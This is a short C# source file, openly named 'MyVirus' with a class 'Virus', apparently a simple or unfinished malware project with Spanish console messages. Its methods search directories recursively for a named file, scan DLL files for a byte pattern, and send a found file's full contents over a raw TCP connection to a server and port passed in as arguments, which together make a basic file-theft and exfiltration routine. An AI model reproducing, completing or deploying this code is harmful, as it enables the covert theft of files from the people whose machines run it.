using System;
using System.Net.Sockets;

namespace MyVirus
{
    class Virus
    {
        public string FileFinder(string rootDirectory, string fileName)
        {
            string filePath = Path.Combine(rootDirectory, fileName);
            if (File.Exists(filePath))
            {
                Console.WriteLine("Encontro el archivo");
                return filePath;
            }
            
            string[] directories = Directory.GetDirectories(rootDirectory);
            for (int i = 0; i < directories.Length; i++)
            {
                string subdirectory = directories[i];
                try
                {
                    filePath = FileFinder(subdirectory, fileName);
                    
                    if (!string.IsNullOrEmpty(filePath))
                    {
                        return filePath;
                    }
                }
                catch (UnauthorizedAccessException)
                {
                    continue;
                }
            }

            return null;
        }

        public string BinaryFileFinder(string rootDirectory, byte[] bytePattern)
        {
            string[] files = Directory.GetFiles(rootDirectory, "*.dll", SearchOption.AllDirectories);
            foreach (string file in files)
            {
                byte[] fileBytes = File.ReadAllBytes(file);
                if (ByteArrayContainsPattern(fileBytes, bytePattern))
                {
                    return file;
                }
            }

            return null;
        }

        public bool ByteArrayContainsPattern(byte[] array, byte[] pattern)
        {
            for (int i = 0; i < array.Length - pattern.Length; i++)
            {
                bool isMatch = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (array[i + j] != pattern[j])
                    {
                        isMatch = false;
                        break;
                    }
                }

                if (isMatch)
                {
                    return true;
                }
            }

            return false;
        }

        public void MessageSender(string filepath, string server, int port)
        {
            try
            {
                TcpClient client = new(server, port);
                NetworkStream stream = client.GetStream();
                byte[] data = File.ReadAllBytes(filepath);
                stream.Write(data, 0, data.Length);
            }
            catch(Exception e)
            {
                Console.WriteLine($"Hubo un error al enviar mensaje, \nError: {e.Message}");
            }
        }

    }
}
